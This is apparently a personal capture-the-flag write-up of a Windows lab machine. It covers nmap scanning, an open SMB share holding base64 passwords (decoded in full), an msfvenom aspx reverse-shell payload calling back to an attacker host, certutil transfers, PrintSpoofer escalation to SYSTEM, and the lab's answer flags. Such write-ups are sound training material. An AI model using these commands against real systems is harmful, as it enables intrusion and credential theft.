## Target: 10.64.150.149
### Recon
- Nmap:
	- ``nmap -p- 10.64.150.149``
	- ``nmap -p 80,135,139,445,3389 -A 10.64.150.149 -v``
### Enumeration
Open Ports:
- **80**/tcp    open  **http**, Microsoft IIS httpd 10.0
- **135**/tcp   open  **msrpc**, Microsoft Windows RPC
- **139**/tcp   open  **netbios-ssn**, Microsoft Windows netbios-ssn
- **445**/tcp   open  **microsoft-ds**, Windows Server 2016 Standard Evaluation 14393 microsoft-ds
- **3389**/tcp  open  **ms-wbt-server**, Microsoft Terminal Services
- **49663**/tcp open  unknown
- **49666**/tcp open  unknown
- **49667**/tcp open  unknown
- Web Findings:
	- Port **80** is running **Microsoft-IIS/10.0**, there are some known vulnerabilities:

**Note - target machine crashed so we restarted multiple times. As such there will be multiple remote IPs in this writeup.**
### Vulnerabilities
##### Findings:
- **Microsoft IIS 10.0** has some known vulnerabilities
- Gobuster finds nothing
- We find that **SMB** has a share called **nt4wrksv** that does not require a password
	- In the share we discover and download a file called _passwords.txt_
	- Contents of the file: _Qm9iIC0gIVBAJCRXMHJEITEyMw== QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk_
	- Both strings turn out to be base64
	- ``Bob - !P@$$W0rD!123`` & ``Bill - Juw4nnaM4n420696969!$$$``
	- **SSH** is not running, so we will try to log into the other shares using these credentials
- Sure enough, Bill's creds work for the IPC$ share
- We don't find much (anything) in the IPC$ share

Lets try:
``nmap -p 445,49663,49666,49667 --script smb-security-mode,smb-vuln-cve2009-3103,smb-vuln-ms17-010 --script-args smbusername=Bill,smbpassword='Juw4nnaM4n420696969!$$$' -sV 10.64.150.149``
- _Service Info: OSs: Windows Server 2008 R2 - 2012, Windows; CPE: cpe:/o:microsoft:windows_
This looks juicy:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).

**However, this proved futile.**

- Checking one of the nonstandard ports **44663** in a web browser showed the same thing as on port 80. 
- Gobuster shows a _/aspnet_client_ page, indicating that the site uses ASP.NET
- Perhaps we can upload an .aspx reverse shell
- Navigating to http://10.65.181.164:49663/nt4wrksv/passwords.txt takes us to a page with the information we retrieved from the share, and indicates that we can execute a reverse shell here.

### Exploitation
We create a msfvenom payload like so:
``msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.65.119.252 LPORT=4444 -f aspx > exploit3.aspx``
Start a nc listener: ``nc -nlvp 4444``
Navigate to the file in a browser or curl it. Catch the shell!
### Post Exploitation
We are dropped in as _apppool\defaultapppool_ 
Navigating to the C:\Users directory, we see a user Bob, in addition to a Public directory and an Administrator user.
In Bob's Desktop we find the user.txt flag _THM{fdk4ka34vk346ksxfr21tg789ktf45}_
### Privilege Escalation
Uploaded winPEAS.exe to the remote machine using certutil.
winPEAS shows us that `SeImpersonatePrivilege` is enabled. Some research revealed that we can use a tool called Printspoofer to elevate our privileges.
We get it to the box with certutil again and then execute it and spawn a powershell instance as SYSTEM.
``PrintSpoofer64.exe -i -c powershell.exe``
Boom. SYSTEM
![[Screenshot 2026-01-09 at 8.57.14 PM.png]]
We navigate to the Administrator Desktop and grab the root.txt flag.
### Flags
- User: _THM{fdk4ka34vk346ksxfr21tg789ktf45}_
- Root: _THM{1fk5kf469devly1gl320zafgl345pv}_
### Notes
__Do a deep dive on winPEAS because I need to be able to identify privesc vectors from its output.
Find a way to view the whole winPEAS output. As it stands the buffer on most of these shells cuts off the top of the output.__
